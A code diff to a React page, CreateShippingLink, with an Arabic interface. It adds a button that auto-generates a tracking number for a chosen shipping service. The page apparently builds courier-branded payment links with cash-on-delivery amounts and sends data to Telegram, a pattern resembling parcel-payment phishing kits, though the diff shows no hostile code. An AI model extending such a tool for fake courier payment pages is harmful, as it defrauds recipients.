@@ -14,9 +14,10 @@ import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } f
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User, RefreshCw } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import { generateTrackingNumber, formatTrackingNumber } from "@/lib/trackingNumberGenerator";
 import TelegramTest from "@/components/TelegramTest";
 import {
   AlertDialog,
@@ -38,6 +39,7 @@ const CreateShippingLink = () => {
   
   const [selectedService, setSelectedService] = useState("");
   const [trackingNumber, setTrackingNumber] = useState("");
+  const [isGenerating, setIsGenerating] = useState(false);
   const [payerType, setPayerType] = useState("recipient"); // "recipient" or "sender"
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("500");
@@ -249,13 +251,42 @@ const CreateShippingLink = () => {
                   <Hash className="w-3 h-3" />
                   رقم الشحنة *
                 </Label>
-                <Input
-                  value={trackingNumber}
-                  onChange={(e) => setTrackingNumber(e.target.value)}
-                  placeholder="مثال: 1234567890"
-                  className="h-9 text-sm"
-                  required
-                />
+                <div className="flex gap-2">
+                  <Input
+                    value={trackingNumber}
+                    onChange={(e) => setTrackingNumber(e.target.value)}
+                    placeholder="مثال: 1234567890"
+                    className="h-9 text-sm flex-1"
+                    required
+                    readOnly={isGenerating}
+                  />
+                  {selectedService && (
+                    <Button
+                      type="button"
+                      variant="outline"
+                      size="sm"
+                      onClick={() => {
+                        setIsGenerating(true);
+                        const newTrackingNumber = generateTrackingNumber(selectedService);
+                        setTrackingNumber(newTrackingNumber);
+                        setTimeout(() => setIsGenerating(false), 300);
+                        toast({
+                          title: "تم التوليد!",
+                          description: `رقم الشحنة: ${newTrackingNumber}`,
+                        });
+                      }}
+                      className="h-9 px-3"
+                      disabled={isGenerating}
+                    >
+                      <RefreshCw className={`w-3 h-3 ${isGenerating ? 'animate-spin' : ''}`} />
+                    </Button>
+                  )}
+                </div>
+                {selectedService && (
+                  <p className="text-xs text-muted-foreground mt-1">
+                    💡 اضغط على زر التحديث لتوليد رقم شحنة تلقائي
+                  </p>
+                )}
               </div>
 
               {/* Payer Type Selection */}
